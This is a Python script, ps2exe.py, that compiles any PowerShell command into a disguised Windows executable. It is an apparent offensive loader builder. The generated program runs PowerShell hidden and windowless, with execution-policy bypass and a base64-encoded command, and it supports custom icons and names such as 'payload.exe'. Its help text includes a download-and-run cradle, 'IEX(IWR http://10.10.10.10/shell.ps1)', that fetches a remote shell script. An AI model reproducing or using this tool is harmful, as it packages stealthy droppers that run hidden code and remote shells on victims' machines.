#!/usr/bin/env python3
"""
ps2exe.py - Convert PowerShell command to standalone .exe
Uses csc.exe (built into Windows) - no external deps

Usage:
    python ps2exe.py "whoami"
    python ps2exe.py "Get-Process | Out-File C:\\temp\\procs.txt" -o stealth.exe
    python ps2exe.py -f script.ps1 -o runner.exe
"""

import argparse
import base64
import subprocess
import tempfile
import shutil
import os
import sys

CS_TEMPLATE = '''
using System;
using System.Diagnostics;

class P {{
    static void Main() {{
        ProcessStartInfo psi = new ProcessStartInfo();
        psi.FileName = "powershell.exe";
        psi.Arguments = "-NoP -NonI -W Hidden -Exec Bypass -EncodedCommand {encoded}";
        psi.WindowStyle = ProcessWindowStyle.Hidden;
        psi.CreateNoWindow = true;
        Process.Start(psi);
    }}
}}
'''

CS_TEMPLATE_WAIT = '''
using System;
using System.Diagnostics;

class P {{
    static void Main() {{
        ProcessStartInfo psi = new ProcessStartInfo();
        psi.FileName = "powershell.exe";
        psi.Arguments = "-NoP -NonI -Exec Bypass -EncodedCommand {encoded}";
        psi.UseShellExecute = false;
        psi.RedirectStandardOutput = true;
        psi.RedirectStandardError = true;
        Process p = Process.Start(psi);
        Console.Write(p.StandardOutput.ReadToEnd());
        Console.Write(p.StandardError.ReadToEnd());
        p.WaitForExit();
    }}
}}
'''

def encode_ps(cmd: str) -> str:
    """Encode PowerShell command to base64 (UTF-16LE)"""
    return base64.b64encode(cmd.encode('utf-16-le')).decode('ascii')

def find_csc() -> str:
    """Find csc.exe on the system"""
    # Check common .NET Framework paths
    framework_paths = [
        r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe",
        r"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe",
        r"C:\Windows\Microsoft.NET\Framework64\v3.5\csc.exe",
        r"C:\Windows\Microsoft.NET\Framework\v3.5\csc.exe",
    ]

    for path in framework_paths:
        if os.path.exists(path):
            return path

    # Try PATH
    result = shutil.which("csc.exe")
    if result:
        return result

    raise FileNotFoundError("csc.exe not found. Is .NET Framework installed?")

def build_exe(ps_cmd: str, output: str, wait: bool = False, icon: str = None) -> bool:
    """Build the exe from PowerShell command"""

    encoded = encode_ps(ps_cmd)
    template = CS_TEMPLATE_WAIT if wait else CS_TEMPLATE
    cs_code = template.format(encoded=encoded)

    csc = find_csc()

    with tempfile.TemporaryDirectory() as tmpdir:
        cs_file = os.path.join(tmpdir, "payload.cs")
        with open(cs_file, 'w') as f:
            f.write(cs_code)

        # Build csc command
        csc_args = [
            csc,
            "/nologo",
            "/optimize+",
            "/target:winexe" if not wait else "/target:exe",
            f"/out:{output}",
        ]

        if icon and os.path.exists(icon):
            csc_args.append(f"/win32icon:{icon}")

        csc_args.append(cs_file)

        result = subprocess.run(csc_args, capture_output=True, text=True)

        if result.returncode != 0:
            print(f"[!] Compilation failed:\n{result.stderr}", file=sys.stderr)
            return False

        print(f"[+] Built: {output}")
        print(f"[+] Size: {os.path.getsize(output)} bytes")
        return True

def main():
    parser = argparse.ArgumentParser(
        description="Convert PowerShell command to standalone .exe",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
    %(prog)s "whoami > C:\\temp\\out.txt"
    %(prog)s "IEX(IWR http://10.10.10.10/shell.ps1)" -o loader.exe
    %(prog)s -f payload.ps1 -o runner.exe
    %(prog)s "Get-Process" --wait    # Shows output in console
        """
    )

    parser.add_argument("command", nargs="?", help="PowerShell command to execute")
    parser.add_argument("-f", "--file", help="Read command from .ps1 file")
    parser.add_argument("-o", "--output", default="payload.exe", help="Output exe name (default: payload.exe)")
    parser.add_argument("--wait", action="store_true", help="Wait for command and show output (console app)")
    parser.add_argument("--icon", help="Path to .ico file for the exe")
    parser.add_argument("--encode-only", action="store_true", help="Just print the encoded command, don't build exe")

    args = parser.parse_args()

    # Get the command
    if args.file:
        with open(args.file, 'r') as f:
            ps_cmd = f.read()
    elif args.command:
        ps_cmd = args.command
    else:
        parser.print_help()
        sys.exit(1)

    if args.encode_only:
        print(encode_ps(ps_cmd))
        sys.exit(0)

    # Build it
    success = build_exe(ps_cmd, args.output, args.wait, args.icon)
    sys.exit(0 if success else 1)

if __name__ == "__main__":
    main()
